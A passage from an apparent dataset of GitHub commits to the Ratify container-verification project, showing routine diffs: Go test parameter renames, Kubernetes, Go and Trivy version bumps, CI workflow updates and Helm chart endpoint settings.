digest.FromString(\"test\")\n \ttestExecutor := &TestExecutor{\n-\t\tfind: func(plugin string, paths []string) (string, error) {\n+\t\tfind: func(_ string, _ []string) (string, error) {\n \t\t\treturn testPath, nil\n \t\t},\n-\t\texecute: func(ctx context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n+\t\texecute: func(_ context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n \t\t\tif pluginPath != testPath {\n \t\t\t\tt.Fatalf(\"mismatch in plugin path expected %s actual %s\", testPath, pluginPath)\n \t\t\t}\n```\n\nFilename: pkg/referrerstore/plugin/skel/skel_test.go:\n```\n@@ -54,7 +54,7 @@\nfunc teardown() {\n }\n \n func TestPluginMain_GetBlobContent_ReturnsExpected(t *testing.T) {\n-\tgetBlobContent := func(args *CmdArgs, subjectReference common.Reference, digest digest.Digest) ([]byte, error) {\n+\tgetBlobContent := func(_ *CmdArgs, _ common.Reference, digest digest.Digest) ([]byte, error) {\n \t\treturn []byte(digest.String()), nil\n \t}\n \tenvironment := map[string]string{\n\n@@ -85,7 +85,7 @@\nfunc TestPluginMain_GetBlobContent_ReturnsExpected(t *testing.T) {\n }\n \n func TestPluginMain_GetReferenceManifest_ReturnsExpected(t *testing.T) {\n-\tgetReferenceManifest := func(args *CmdArgs, subjectReference common.Reference, digest digest.Digest) (ocispecs.ReferenceManifest, error) {\n+\tgetReferenceManifest := func(_ *CmdArgs, _ common.Reference, _ digest.Digest) (ocispecs.ReferenceManifest, error) {\n \t\treturn ocispecs.ReferenceManifest{\n \t\t\tArtifactType: \"test-type\",\n \t\t}, nil\n\n@@ -120,7 +120,7 @@\nfunc TestPluginMain_GetReferenceManifest_ReturnsExpected(t *testing.T) {\n }\n \n func TestPluginMain_ListReferrers_ReturnsExpected(t *testing.T) {\n-\tlistReferrers := func(args *CmdArgs, subjectReference common.Reference, artifactTypes []string, nextToken string, subjectDesc *ocispecs.SubjectDescriptor) (*referrerstore.ListReferrersResult, error) {\n+\tlistReferrers := func(_ *CmdArgs, _ common.Reference, _ []string, _ string, _ *ocispecs.SubjectDescriptor) (*referrerstore.ListReferrersResult, error) {\n \t\treturn &referrerstore.ListReferrersResult{\n \t\t\tNextToken: \"next-token\",\n \t\t\tReferrers: []ocispecs.ReferenceDescriptor{\n\n@@ -161,7 +161,7 @@\nfunc TestPluginMain_ListReferrers_ReturnsExpected(t *testing.T) {\n \n func TestPluginMain_GetSubjectDesc_ReturnsExpected(t *testing.T) {\n \ttestDigest := digest.FromString(\"test\")\n-\tgetSubjectDesc := func(args *CmdArgs, subjectReference common.Reference) (*ocispecs.SubjectDescriptor, error) {\n+\tgetSubjectDesc := func(_ *CmdArgs, _ common.Reference) (*ocispecs.SubjectDescriptor, error) {\n \t\treturn &ocispecs.SubjectDescriptor{Descriptor: v1.Descriptor{Digest: testDigest}}, nil\n \t}\n\n@@ -193,7 +193,7 @@\nfunc TestPluginMain_GetSubjectDesc_ReturnsExpected(t *testing.T) {\n }\n \n func TestPluginMain_ErrorCases(t *testing.T) {\n-\tgetBlobContent := func(args *CmdArgs, subjectReference common.Reference, digest digest.Digest) ([]byte, error) {\n+\tgetBlobContent := func(_ *CmdArgs, _ common.Reference, _ digest.Digest) ([]byte, error) {\n \t\treturn nil, fmt.Errorf(\"simulated error\")\n \t}\n \tenvironment := map[string]string{\n\n@@ -266,7 +266,7 @@\nfunc TestPluginMain_ErrorCases(t *testing.T) {\n }\n \n func TestPluginMain_GetBlobContent_ErrorCases(t *testing.T) {\n-\tgetBlobContent := func(args *CmdArgs, subjectReference common.Reference, digest digest.Digest) ([]byte, error) {\n+\tgetBlobContent := func(_ *CmdArgs, _ common.Reference, digest digest.Digest) ([]byte, error) {\n \t\treturn []byte(digest.String()), nil\n \t}\n \tenvironment := map[string]string{\n\n@@ -301,7 +301,7 @@\nfunc TestPluginMain_GetBlobContent_ErrorCases(t *testing.T) {\n }\n \n func TestPluginMain_ListReferrers_ErrorCases(t *testing.T) {\n-\tlistReferrers := func(args *CmdArgs, subjectReference common.Reference, artifactTypes []string, nextToken string, subjectDesc *ocispecs.SubjectDescriptor) (*referrerstore.ListReferrersResult, error) {\n+\tlistReferrers := func(_ *CmdArgs, _ common.Reference, _ []string, _ string, _ *ocispecs.SubjectDescriptor) (*referrerstore.ListReferrersResult, error) {\n \t\treturn &referrerstore.ListReferrersResult{\n \t\t\tNextToken: \"next-token\",\n \t\t\tReferrers: []ocispecs.ReferenceDescriptor{\n```\n\nFilename: pkg/verifier/notation/pluginmanager.go:\n```\n@@ -52,7 +52,7 @@\nfunc (m *RatifyPluginManager) Get(ctx context.Context, name string) (plugin.Plug\n // Lists available notation plugins in the target directory\n func (m *RatifyPluginManager) List(_ context.Context) ([]string, error) {\n \tvar plugins []string\n-\terr := fs.WalkDir(m.pluginFS, \".\", func(dir string, d fs.DirEntry, err error) error {\n+\terr := fs.WalkDir(m.pluginFS, \".\", func(_ string, d fs.DirEntry, err error) error {\n \t\tif err != nil {\n \t\t\treturn err\n \t\t}\n```\n\nFilename: pkg/verifier/plugin/plugin_test.go:\n```\n@@ -68,10 +68,10 @@\nfunc TestNewVerifier_Expected(t *testing.T) {\n func TestVerify_IsSuccessTrue_Expected(t *testing.T) {\n \ttestPlugin := \"test-plugin\"\n \ttestExecutor := &TestExecutor{\n-\t\tfind: func(plugin string, paths []string) (string, error) {\n+\t\tfind: func(_ string, _ []string) (string, error) {\n \t\t\treturn testPath, nil\n \t\t},\n-\t\texecute: func(ctx context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n+\t\texecute: func(_ context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n \t\t\tif pluginPath != testPath {\n \t\t\t\tt.Fatalf(\"mismatch in plugin path expected %s actual %s\", testPath, pluginPath)\n \t\t\t}\n\n@@ -145,10 +145,10 @@\nfunc TestVerify_IsSuccessTrue_Expected(t *testing.T) {\n func TestVerify_IsSuccessFalse_Expected(t *testing.T) {\n \ttestPlugin := \"test-plugin\"\n \ttestExecutor := &TestExecutor{\n-\t\tfind: func(plugin string, paths []string) (string, error) {\n+\t\tfind: func(_ string, _ []string) (string, error) {\n \t\t\treturn testPath, nil\n \t\t},\n-\t\texecute: func(ctx context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n+\t\texecute: func(_ context.Context, pluginPath string, cmdArgs []string, stdinData []byte, environ []string) ([]byte, error) {\n \t\t\tif pluginPath != testPath {\n \t\t\t\tt.Fatalf(\"mismatch in plugin path expected %s actual %s\", testPath, pluginPath)\n \t\t\t}\n```\n\nFilename: pkg/verifier/plugin/skel/skel_test.go:\n```\n@@ -60,7 +60,7 @@\nfunc teardown() {\n }\n \n func TestPluginMain_VerifyReference_ReturnsExpected(t *testing.T) {\n-\tverifyReference := func(args *CmdArgs, subjectReference common.Reference, referenceDescriptor ocispecs.ReferenceDescriptor, referrerStore referrerstore.ReferrerStore) (*verifier.VerifierResult, error) {\n+\tverifyReference := func(_ *CmdArgs, _ common.Reference, referenceDescriptor ocispecs.ReferenceDescriptor, referrerStore referrerstore.ReferrerStore) (*verifier.VerifierResult, error) {\n \t\tif referenceDescriptor.ArtifactType != \"test-type\" {\n \t\t\tt.Fatalf(\"expected artifact type %s actual %s\", \"test-type\", referenceDescriptor.ArtifactType)\n \t\t}\n\n@@ -107,7 +107,7 @@\nfunc TestPluginMain_VerifyReference_ReturnsExpected(t *testing.T) {\n }\n \n func TestPluginMain_VerifyReference_CanUseBuiltinStores(t *testing.T) {\n-\tverifyReference := func(args *CmdArgs, subjectReference common.Reference, referenceDescriptor ocispecs.ReferenceDescriptor, referrerStore referrerstore.ReferrerStore) (*verifier.VerifierResult, error) {\n+\tverifyReference := func(_ *CmdArgs, _ common.Reference, _ ocispecs.ReferenceDescriptor, referrerStore referrerstore.ReferrerStore) (*verifier.VerifierResult, error) {\n \t\t// expect to find a builtin store and fail if it was configured as a plugin\n \t\tif _, ok := referrerStore.(*sp.StorePlugin); ok {\n \t\t\tt.Fatalf(\"expected store to be builtin\")\n\n@@ -144,7 +144,7 @@\nfunc TestPluginMain_VerifyReference_CanUseBuiltinStores(t *testing.T) {\n }\n \n func TestPluginMain_ErrorCases(t *testing.T) {\n-\tverifyReference := func(args *CmdArgs, subjectReference common.Reference, referenceDescriptor ocispecs.ReferenceDescriptor, referrerStore referrerstore.ReferrerStore) (*verifier.VerifierResult, error) {\n+\tverifyReference := func(_ *CmdArgs, _ common.Reference, _ ocispecs.ReferenceDescriptor, _ referrerstore.ReferrerStore) (*verifier.VerifierResult, error) {\n \t\treturn nil, fmt.Errorf(\"simulated error\")\n \t}\n \tenvironment := map[string]string{\n```\n\nFilename: scripts/azure-ci-test.sh:\n```\n@@ -27,8 +27,8 @@\nexport AKS_NAME=\"${AKS_NAME:-ratify-aks-${SUFFIX}}\"\n export KEYVAULT_NAME=\"${KEYVAULT_NAME:-ratify-akv-${SUFFIX}}\"\n export USER_ASSIGNED_IDENTITY_NAME=\"${USER_ASSIGNED_IDENTITY_NAME:-ratify-e2e-identity-${SUFFIX}}\"\n export LOCATION=\"westus2\"\n-export KUBERNETES_VERSION=${1:-1.29.2}\n-GATEKEEPER_VERSION=${2:-3.15.0}\n+export KUBERNETES_VERSION=${1:-1.30.6}\n+GATEKEEPER_VERSION=${2:-3.17.0}\n TENANT_ID=$3\n export RATIFY_NAMESPACE=${4:-gatekeeper-system}\n CERT_DIR=${5:-\"~/ratify/certs\"}\n```\n\nFilename: terraform/azure/main.tf:\n```\n@@ -107,7 +107,7 @@\nresource \"azurerm_kubernetes_cluster\" \"aks\" {\n   location                  = azurerm_resource_group.rg.location\n   resource_group_name       = azurerm_resource_group.rg.name\n   dns_prefix                = \"${var.cluster_name}-dns\"\n-  kubernetes_version        = \"1.29.2\"\n+  kubernetes_version        = \"1.30.6\"\n   workload_identity_enabled = true\n   oidc_issuer_enabled       = true\n```",
                "url": "https://github.com/ratify-project/ratify/commit/0ec0c08490e3d672ae64b1a220c90d5484f1c93f"
            },
            {
                "content": "fix: enforce host checking before exchanging a refresh token (#2069) (#2081)\n\nSigned-off-by: Binbin Li <libinbin@microsoft.com>\n\nFilename: .github/crd.trivyignore.yaml:\n```\n@@ -0,0 +1,3 @@\n+vulnerabilities:\n+  - id: CVE-2024-45338\n+    statement: kubectl is not vulnerable to this and is reason for being flagged\n\\ No newline at end of file\n```\n\nFilename: .github/dependabot.yml:\n```\n@@ -33,7 +33,7 @@\nupdates:\n       interval: \"weekly\"\n     ignore:\n       - dependency-name: \"golang\"\n-        versions: '> 1.22'\n+        versions: '> 1.23'\n     commit-message:\n       prefix: \"chore\"\n\n@@ -43,6 +43,6 @@\nupdates:\n       interval: \"weekly\"\n     ignore:\n       - dependency-name: \"vscode/devcontainers/go\"\n-        versions: '> 1.22'\n+        versions: '> 1.23'\n     commit-message:\n       prefix: \"chore\"\n```\n\nFilename: .github/workflows/build-pr.yml:\n```\n@@ -24,7 +24,7 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.29.2\"]\n+        KUBERNETES_VERSION: [\"1.30.6\"]\n         GATEKEEPER_VERSION: [\"3.17.0\"]\n     uses: ./.github/workflows/e2e-k8s.yml\n     with:\n\n@@ -37,7 +37,7 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.28.12\", \"1.29.2\"]\n+        KUBERNETES_VERSION: [\"1.29.10\", \"1.30.6\"]\n         GATEKEEPER_VERSION: [\"3.15.0\", \"3.16.0\", \"3.17.0\"]\n     uses: ./.github/workflows/e2e-k8s.yml\n     with:\n\n@@ -53,7 +53,7 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.28.12\", \"1.29.2\"]\n+        KUBERNETES_VERSION: [\"1.29.10\", \"1.30.6\"]\n         GATEKEEPER_VERSION: [\"3.15.0\", \"3.16.0\", \"3.17.0\"]\n     uses: ./.github/workflows/e2e-aks.yml\n     with:\n\n@@ -76,10 +76,10 @@\njobs:\n \n       - name: Check out code into the Go module directory\n         uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n-      - name: Set up Go 1.22\n+      - name: Set up Go 1.23\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n \n       - name: Az CLI login\n         uses: azure/login@6c251865b4e6290e7b78be643ea2d005bc51f69a # v2.1.1\n```\n\nFilename: .github/workflows/codeql.yml:\n```\n@@ -35,7 +35,7 @@\njobs:\n       - name: setup go environment\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n       - name: Initialize CodeQL\n         uses: github/codeql-action/init@4dd16135b69a43b6c8efb853346f8437d92d3c93 # tag=v3.26.6\n         with:\n```\n\nFilename: .github/workflows/e2e-aks.yml:\n```\n@@ -9,7 +9,7 @@\non:\n       k8s_version:\n         description: \"Kubernetes version\"\n         required: true\n-        default: \"1.29.2\"\n+        default: \"1.30.6\"\n         type: string\n       gatekeeper_version:\n         description: \"Gatekeeper version\"\n\n@@ -34,10 +34,10 @@\njobs:\n \n       - name: Check out code into the Go module directory\n         uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n-      - name: Set up Go 1.22\n+      - name: Set up Go 1.23\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n       - name: Az CLI login\n         uses: azure/login@6c251865b4e6290e7b78be643ea2d005bc51f69a # v2.1.1\n         with:\n```\n\nFilename: .github/workflows/e2e-cli.yml:\n```\n@@ -43,7 +43,7 @@\njobs:\n       - name: setup go environment\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n       - name: Run tidy\n         run: go mod tidy\n       - name: Build CLI\n\n@@ -72,7 +72,7 @@\njobs:\n       - name: setup go environment\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n       - name: Run tidy\n         run: go mod tidy\n       - name: Build CLI\n```\n\nFilename: .github/workflows/e2e-k8s.yml:\n```\n@@ -9,7 +9,7 @@\non:\n       k8s_version:\n         description: \"Kubernetes version\"\n         required: true\n-        default: \"1.29.2\"\n+        default: \"1.30.6\"\n         type: string\n       gatekeeper_version:\n         description: \"Gatekeeper version\"\n\n@@ -32,10 +32,10 @@\njobs:\n \n       - name: Check out code into the Go module directory\n         uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n-      - name: Set up Go 1.22\n+      - name: Set up Go 1.23\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n \n       - name: Bootstrap e2e\n         run: |\n```\n\nFilename: .github/workflows/golangci-lint.yml:\n```\n@@ -21,10 +21,10 @@\njobs:\n \n       - uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n       - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n       - name: golangci-lint\n         uses: golangci/golangci-lint-action@aaa42aa0628b4ae2578232a66b541047968fac86 # v6.1.0\n         with:\n-          version: v1.59.1\n-          args: --timeout=10m\n+          version: v1.62.2\n+          args: --timeout=20m\n```\n\nFilename: .github/workflows/high-availability.yml:\n```\n@@ -36,10 +36,10 @@\njobs:\n \n       - name: Check out code into the Go module directory\n         uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n-      - name: Set up Go 1.22\n+      - name: Set up Go 1.23\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n \n       - name: Bootstrap e2e\n         run: |\n```\n\nFilename: .github/workflows/publish-dev-assets.yml:\n```\n@@ -69,7 +69,7 @@\njobs:\n           docker buildx build \\\n             --attest type=sbom \\\n             --attest type=provenance,mode=max \\\n-            --build-arg KUBE_VERSION=\"1.29.2\" \\\n+            --build-arg KUBE_VERSION=\"1.30.6\" \\\n             -f crd.Dockerfile \\\n             --platform linux/amd64,linux/arm64,linux/arm/v7 \\\n             --label org.opencontainers.image.revision=${{ github.sha }} \\\n```\n\nFilename: .github/workflows/publish-package.yml:\n```\n@@ -51,7 +51,7 @@\njobs:\n           docker buildx build \\\n             --attest type=sbom \\\n             --attest type=provenance,mode=max \\\n-            --build-arg KUBE_VERSION=\"1.29.2\" \\\n+            --build-arg KUBE_VERSION=\"1.30.6\" \\\n             -f crd.Dockerfile \\\n             --platform linux/amd64,linux/arm64,linux/arm/v7 \\\n             --label org.opencontainers.image.revision=${{ github.sha }} \\\n```\n\nFilename: .github/workflows/quick-start.yml:\n```\n@@ -27,7 +27,7 @@\njobs:\n       contents: read\n     strategy:\n       matrix:\n-        KUBERNETES_VERSION: [\"1.29.2\"]\n+        KUBERNETES_VERSION: [\"1.30.6\"]\n     steps:\n       - name: Harden Runner\n         uses: step-security/harden-runner@91182cccc01eb5e619899d80e4e971d6181294a7 # v2.10.1\n\n@@ -39,7 +39,7 @@\njobs:\n       - name: setup go environment\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n       - name: Run tidy\n         run: go mod tidy\n       - name: Bootstrap e2e\n```\n\nFilename: .github/workflows/release.yml:\n```\n@@ -31,7 +31,7 @@\njobs:\n       - name: Set up Go\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n \n       - name: Goreleaser\n         id: goreleaser\n```\n\nFilename: .github/workflows/run-full-validation.yml:\n```\n@@ -26,7 +26,7 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.28.12\", \"1.29.2\"]\n+        KUBERNETES_VERSION: [\"1.29.10\", \"1.30.6\"]\n         GATEKEEPER_VERSION: [\"3.15.0\", \"3.16.0\", \"3.17.0\"]\n     uses: ./.github/workflows/e2e-k8s.yml\n     with:\n\n@@ -41,7 +41,7 @@\njobs:\n     strategy:\n       fail-fast: false\n       matrix:\n-        KUBERNETES_VERSION: [\"1.28.12\", \"1.29.2\"]\n+        KUBERNETES_VERSION: [\"1.29.10\", \"1.30.6\"]\n         GATEKEEPER_VERSION: [\"3.15.0\", \"3.16.0\", \"3.17.0\"]\n     uses: ./.github/workflows/e2e-aks.yml\n     with:\n\n@@ -64,10 +64,10 @@\njobs:\n \n       - name: Check out code into the Go module directory\n         uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7\n-      - name: Set up Go 1.22\n+      - name: Set up Go 1.23\n         uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2\n         with:\n-          go-version: \"1.22\"\n+          go-version: \"1.23\"\n \n       - name: Az CLI login\n         uses: azure/login@6c251865b4e6290e7b78be643ea2d005bc51f69a # v2.1.1\n```\n\nFilename: .github/workflows/scan-vulns.yaml:\n```\n@@ -37,6 +37,8 @@\njobs:\n     name: \"[Trivy] Scan for vulnerabilities\"\n     runs-on: ubuntu-22.04\n     timeout-minutes: 15\n+    env:\n+      TRIVY_VERSION: 0.58.2\n     steps:\n       - name: Harden Runner\n         uses: step-security/harden-runner@91182cccc01eb5e619899d80e4e971d6181294a7 # v2.10.1\n\n@@ -52,8 +54,6 @@\njobs:\n           wget https://github.com/aquasecurity/trivy/releases/download/v${{ env.TRIVY_VERSION }}/trivy_${{ env.TRIVY_VERSION }}_Linux-64bit.tar.gz\n           tar zxvf trivy_${{ env.TRIVY_VERSION }}_Linux-64bit.tar.gz\n           echo \"$(pwd)\" >> $GITHUB_PATH\n-        env:\n-          TRIVY_VERSION: \"0.46.0\"\n \n       - name: Run trivy on git repository\n         run: |\n\n@@ -70,6 +70,5 @@\njobs:\n           done\n       - name: Run trivy on images and exit on HIGH severity\n         run: |\n-          for img in \"localbuild:test\" \"localbuildcrd:test\"; do\n-              trivy image --ignore-unfixed --exit-code 1 --severity HIGH --vuln-type=\"os,library\" \"${img}\"\n-          done\n+          trivy image --skip-db-update --ignore-unfixed --exit-code 1 --severity HIGH,CRITICAL --vuln-type=\"os,library\" \"localbuild:test\"\n+          trivy image --skip-db-update --ignore-unfixed --exit-code 1 --severity HIGH,CRITICAL --vuln-type=\"os,library\" --show-suppressed --ignorefile ./.github/crd.trivyignore.yaml \"localbuildcrd:test\"\n```\n\nFilename: CONTRIBUTING.md:\n```\n@@ -186,7 +186,7 @@\nexport REGISTRY=yourregistry\n docker buildx create --use\n \n docker buildx build -f httpserver/Dockerfile --platform linux/amd64 --build-arg build_sbom=true --build-arg build_licensechecker=true --build-arg build_schemavalidator=true --build-arg build_vulnerabilityreport=true -t ${REGISTRY}/ratify-project/ratify:yourtag .\n-docker build --progress=plain --build-arg KUBE_VERSION=\"1.29.2\" --build-arg TARGETOS=\"linux\" --build-arg TARGETARCH=\"amd64\" -f crd.Dockerfile -t ${REGISTRY}/localbuildcrd:yourtag ./charts/ratify/crds\n+docker build --progress=plain --build-arg KUBE_VERSION=\"1.30.6\" --build-arg TARGETOS=\"linux\" --build-arg TARGETARCH=\"amd64\" -f crd.Dockerfile -t ${REGISTRY}/localbuildcrd:yourtag ./charts/ratify/crds\n ```\n \n #### [Authenticate](https://docs.docker.com/engine/reference/commandline/login/#usage) with your registry,  and push the newly built image\n```\n\nFilename: Makefile:\n```\n@@ -25,9 +25,9 @@\nLDFLAGS += -X $(GO_PKG)/internal/version.GitCommitHash=$(GIT_COMMIT_HASH)\n LDFLAGS += -X $(GO_PKG)/internal/version.GitTreeState=$(GIT_TREE_STATE)\n LDFLAGS += -X $(GO_PKG)/internal/version.GitTag=$(GIT_TAG)\n \n-KIND_VERSION ?= 0.22.0\n-KUBERNETES_VERSION ?= 1.29.2\n-KIND_KUBERNETES_VERSION ?= 1.29.2\n+KIND_VERSION ?= 0.25.0\n+KUBERNETES_VERSION ?= 1.30.6\n+KIND_KUBERNETES_VERSION ?= 1.30.6\n GATEKEEPER_VERSION ?= 3.17.0\n DAPR_VERSION ?= 1.12.5\n COSIGN_VERSION ?= 2.2.3\n\n@@ -202,7 +202,7 @@\ne2e-dependencies:\n \t# Download and install kind\n \tcurl -L https://github.com/kubernetes-sigs/kind/releases/download/v${KIND_VERSION}/kind-linux-amd64 --output ${GITHUB_WORKSPACE}/bin/kind && chmod +x ${GITHUB_WORKSPACE}/bin/kind\n \t# Download and install kubectl\n-\tcurl -L https://storage.googleapis.com/kubernetes-release/release/v${KUBERNETES_VERSION}/bin/linux/amd64/kubectl --output ${GITHUB_WORKSPACE}/bin/kubectl && chmod +x ${GITHUB_WORKSPACE}/bin/kubectl\n+\tcurl -L https://dl.k8s.io/release/v${KUBERNETES_VERSION}/bin/linux/amd64/kubectl --output ${GITHUB_WORKSPACE}/bin/kubectl && chmod +x ${GITHUB_WORKSPACE}/bin/kubectl\n \t# Download and install bats\n \tcurl -sSLO https://github.com/bats-core/bats-core/archive/v${BATS_VERSION}.tar.gz && tar -zxvf v${BATS_VERSION}.tar.gz && bash bats-core-${BATS_VERSION}/install.sh ${GITHUB_WORKSPACE}\n \t# Download and install jq\n\n@@ -270,6 +270,7 @@\ne2e-helmfile-install:\n \tcd .staging/helmfilebin && tar -xvf helmfilebin.tar.gz\n     \n e2e-docker-credential-store-setup:\n+\tsudo apt-get install pass\n \trm -rf .staging/pass\n \tmkdir -p .staging/pass\n \tcd .staging/pass && git clone https://github.com/docker/docker-credential-helpers.git\n```\n\nFilename: charts/ratify/README.md:\n```\n\n```\n\nFilename: charts/ratify/templates/store.yaml:\n```\n@@ -19,11 +19,15 @@\nspec:\n     authProvider:\n       name: azureWorkloadIdentity\n       clientID: {{ .Values.azureWorkloadIdentity.clientId }}\n+      endpoints:\n+        {{- toYaml .Values.oras.authProviders.azureContainerRegistryEndpoints | nindent 8 }}\n     {{- end }}\n     {{- if .Values.oras.authProviders.azureManagedIdentityEnabled }}\n     authProvider:\n       name: azureManagedIdentity\n       clientID: {{ .Values.azureManagedIdentity.clientId }}\n+      endpoints: \n+        {{- toYaml .Values.oras.authProviders.azureContainerRegistryEndpoints | nindent 8 }}\n     {{- end }}\n     {{- if .Values.oras.authProviders.k8secretsEnabled }}\n     authProvider:\n```\n\nFilename: charts/ratify/values.yaml:\n```\n@@ -83,6 +83,7 @@\noras:\n   authProviders:\n     azureWorkloadIdentityEnabled: false\n     azureManagedIdentityEnabled: false\n+    azureContainerRegistryEndpoints: []\n     k8secretsEnabled: false\n     awsEcrBasicEnabled: false\n     awsApiOverride:\n```\n\nFilename: cmd/ratify/cmd/serve.go:\n```\n@@ -118,7 +118,7 @@\nfunc serve(opts serveCmdOptions) error {\n \t\tif err != nil {\n \t\t\treturn err\n \t\t}\n-\t\tlogrus.Infof(\"starting server at\" + opts.httpServerAddress)\n+\t\tlogrus.Infof(\"starting server at %s\", opts.httpServerAddress)\n \t\tif err := server.Run(nil); err != nil {\n \t\t\treturn err\n \t\t}\n```\n\nFilename: crd.Dockerfile:\n```\n@@ -20,7 +20,7 @@\nARG KUBE_VERSION\n RUN echo \"Ratify crd building on $TARGETOS, building for $TARGETARCH\"\n \n RUN apk add --no-cache curl && \\\n-    curl -LO https://storage.googleapis.com/kubernetes-release/release/v${KUBE_VERSION}/bin/${TARGETOS}/${TARGETARCH}/kubectl && \\\n+    curl -LO https://dl.k8s.io/release/v${KUBE_VERSION}/bin/${TARGETOS}/${TARGETARCH}/kubectl && \\\n     chmod +x kubectl\n \n FROM scratch as build\n```\n\nFilename: go.mod:\n```\n@@ -28,8 +28,8 @@\nrequire (\n \tgithub.com/golang/protobuf v1.5.4\n \tgithub.com/google/go-containerregistry v0.20.2\n \tgithub.com/gorilla/mux v1.8.1\n-\tgithub.com/notaryproject/notation-core-go v1.1.0\n-\tgithub.com/notaryproject/notation-go v1.2.1\n+\tgithub.com/notaryproject/notation-core-go v1.2.0\n+\tgithub.com/notaryproject/notation-go v1.3.0\n \tgithub.com/notaryproject/notation-plugin-framework-go v1.0.0\n \tgithub.com/open-policy-agent/cert-controller v0.8.0\n \tgithub.com/open-policy-agent/frameworks/constraint v0.0.0-20230411224310-3f237e2710fa\n\n@@ -47,7 +47,7 @@\nrequire (\n \tgo.opentelemetry.io/otel/exporters/prometheus v0.49.0\n \tgo.opentelemetry.io/otel/metric v1.28.0\n \tgo.opentelemetry.io/otel/sdk/metric v1.27.0\n-\tgolang.org/x/sync v0.8.0\n+\tgolang.org/x/sync v0.10.0\n \tgoogle.golang.org/grpc v1.66.0\n \tgoogle.golang.org/protobuf v1.34.2\n \tk8s.io/api v0.28.13\n\n@@ -96,10 +96,10 @@\nrequire (\n \tgithub.com/emicklei/go-restful/v3 v3.11.0 // indirect\n \tgithub.com/evanphx/json-patch v4.12.0+incompatible // indirect\n \tgithub.com/evanphx/json-patch/v5 v5.6.0 // indirect\n-\tgithub.com/go-asn1-ber/asn1-ber v1.5.5 // indirect\n+\tgithub.com/go-asn1-ber/asn1-ber v1.5.7 // indirect\n \tgithub.com/go-ini/ini v1.67.0 // indirect\n \tgithub.com/go-jose/go-jose/v4 v4.0.2 // indirect\n-\tgithub.com/go-ldap/ldap/v3 v3.4.8 // indirect\n+\tgithub.com/go-ldap/ldap/v3 v3.4.10 // indirect\n \tgithub.com/gobwas/glob v0.2.3 // indirect\n \tgithub.com/golang-jwt/jwt/v5 v5.2.1 // indirect\n \tgithub.com/google/gnostic-models v0.6.9-0.20230804172637-c7be7c783f49 // indirect\n\n@@ -109,7 +109,7 @@\nrequire (\n \tgithub.com/hashicorp/go-retryablehttp v0.7.7 // indirect\n \tgithub.com/miekg/pkcs11 v1.1.1 // indirect\n \tgithub.com/mozillazg/docker-credential-acr-helper v0.3.0 // indirect\n-\tgithub.com/notaryproject/tspclient-go v0.2.0 // indirect\n+\tgithub.com/notaryproject/tspclient-go v1.0.0 // indirect\n \tgithub.com/nozzle/throttler v0.0.0-20180817012639-2ea982251481 // indirect\n \tgithub.com/sagikazarmark/locafero v0.4.0 // indirect\n \tgithub.com/sagikazarmark/slog-shim v0.1.0 // indirect\n\n@@ -171,7 +171,7 @@\nrequire (\n \tgithub.com/go-openapi/swag v0.23.0 // indirect\n \tgithub.com/go-openapi/validate v0.24.0 // indirect\n \tgithub.com/gogo/protobuf v1.3.2 // indirect\n-\tgithub.com/golang-jwt/jwt/v4 v4.5.0 // indirect\n+\tgithub.com/golang-jwt/jwt/v4 v4.5.1 // indirect\n \tgithub.com/golang/glog v1.2.1 // indirect\n \tgithub.com/golang/groupcache v0.0.0-20210331224755-41bb18bfe9da // indirect\n \tgithub.com/golang/snappy v0.0.4 // indirect\n\n@@ -222,7 +222,7 @@\nrequire (\n \tgithub.com/titanous/rocacheck v0.0.0-20171023193734-afe73141d399 // indirect\n \tgithub.com/transparency-dev/merkle 